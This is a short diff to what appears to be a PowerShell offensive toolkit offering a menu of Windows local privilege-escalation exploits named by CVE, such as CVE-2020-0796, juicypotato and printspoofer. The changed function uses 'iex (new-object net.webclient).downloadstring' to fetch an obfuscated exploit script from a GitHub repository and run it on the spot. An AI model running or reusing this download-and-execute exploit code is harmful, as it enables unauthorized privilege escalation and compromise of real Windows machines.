@@ -641,7 +641,7 @@ __        ___       ____
             7{CVE-2019-1129}
 	        8{CVE-2019-1215}
 	        9{CVE-2020-0683-lpe}
-            10{cve-2020-0796-lpe}
+            10{cve-2020-0796}
             11{cve-2020-0787-lpe}
 	    12{juicypot}
             13{printspoofer}
@@ -659,10 +659,10 @@ function testtemp
  }
 }
 
-function cve-2020-0796-lpe
+function cve-2020-0796
 {
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
-    cve-2020-0796
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0796-lpe.ps1')
+    cve-2020-0796-lpe
 }
 
 function cve-2020-0787-lpe
@@ -3000,7 +3000,7 @@ __        ___       ____
         
     }
     }
- While ($masterquestion -ne 16)
+ While ($masterquestion -ne 17)
      
     
     #End
